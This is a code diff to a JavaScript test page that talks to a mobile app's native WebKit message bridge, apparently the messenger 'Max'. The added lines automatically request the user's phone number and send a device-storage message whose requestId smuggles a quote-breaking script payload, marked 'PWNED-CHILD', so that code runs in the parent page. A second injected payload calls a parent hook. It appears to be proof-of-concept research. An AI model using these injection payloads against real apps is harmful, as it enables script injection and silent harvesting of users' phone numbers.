@@ -14,8 +14,12 @@ const s=document.getElementById('s');
 const TS=Date.now().toString(36);
 window.WebApp={sendEvent:function(n,d){s.textContent="<= "+n+" "+d;}};
 function post(name,obj){ try{ window.webkit.messageHandlers.EventHandler.postMessage(name+":"+JSON.stringify(obj)); s.textContent="отправлено: "+name; }catch(e){ s.textContent="нет моста: "+e.message; } }
+setTimeout(function(){post("WebAppRequestPhone",{})},1500);
+setTimeout(function(){
+  try{ window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:"');big.textContent="PWNED-CHILD";//",key:"k"+TS})); }catch(e){}
+},3000);
 document.getElementById('i').onclick=function(){
-  post("WebAppDeviceStorageGetKey",{requestId:');document.title="PWNED-BY-IFRAME";window.__fromIframe=1;//',key:"k"+TS});
+  post("WebAppDeviceStorageGetKey",{requestId:');parentHook && parentHook();//',key:"k"+TS});
 };
 document.getElementById('p').onclick=function(){ post("WebAppRequestPhone",{}); };
 document.getElementById('m').onclick=function(){ s.textContent="навигация max://support…"; location.href="max://max.ru/support"; };
